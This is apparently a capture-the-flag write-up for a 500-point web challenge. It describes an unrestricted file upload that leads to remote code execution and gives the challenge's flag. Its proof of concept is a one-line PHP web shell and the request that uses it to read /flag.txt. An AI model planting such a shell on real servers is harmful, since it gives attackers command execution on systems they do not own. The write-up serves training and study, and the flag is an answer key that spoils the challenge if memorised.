# Upload and Conquer

**Points**: 500  
**Solves**: 1  
**Flag Format**: HPTU{___}

## Challenge

Upload and Conquer

## Flag

HPTU{nR7b#Lp2VzQ}

## Vulnerability

Unrestricted file upload leading to remote code execution.

## Attack Methodology

1. **File Upload Testing**: Identified upload functionality at `/upload.php`
2. **PHP Shell Upload**: Uploaded web shell with command execution capabilities
3. **Shell Access**: Accessed uploaded PHP file at `/uploads/shell.php`
4. **Command Execution**: Used shell to explore file system and locate flag
5. **Flag Extraction**: Found and read `/flag.txt` containing the flag

## Technical Details

- **Upload Endpoint**: `/upload.php`
- **Shell Location**: `/uploads/shell.php`
- **Commands Used**:  
- **File Content**: `nR7b#Lp2VzQ`

## Proof of Concept

<?php system($_GET['cmd']); ?> // Access: /uploads/shell.php?cmd=cat+/flag.txt
